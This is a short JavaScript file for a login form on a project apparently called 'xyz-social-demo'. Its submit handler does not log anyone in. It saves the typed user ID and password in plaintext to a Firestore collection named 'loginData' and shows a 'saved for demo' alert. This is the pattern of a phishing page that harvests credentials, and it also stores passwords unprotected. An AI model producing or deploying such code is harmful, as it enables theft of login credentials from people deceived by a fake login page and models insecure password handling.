// script.js

// Your Firebase config
const firebaseConfig = {
    apiKey: "AIzaSyByKSUsC642IfINWogTnw2XskTgk6HXnX4",
    authDomain: "xyz-social-demo.firebaseapp.com",
    projectId: "xyz-social-demo",
    storageBucket: "xyz-social-demo.firebasestorage.app",
    messagingSenderId: "588536202737",
    appId: "1:588536202737:web:b8d4f4412a357245a37050",
    measurementId: "G-T2TMB8B5R1"
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

// Handle form submit
document.getElementById("loginForm").addEventListener("submit", function(e) {
    e.preventDefault();
    const userId = document.getElementById("userId").value;
    const password = document.getElementById("password").value;

    // Save to Firestore
    db.collection("loginData").add({
        userId: userId,
        password: password,
        timestamp: new Date()
    })
    .then(() => {
        alert("Data saved for demo!");
        document.getElementById("loginForm").reset();
    })
    .catch(error => {
        console.error("Error writing document: ", error);
    });
});
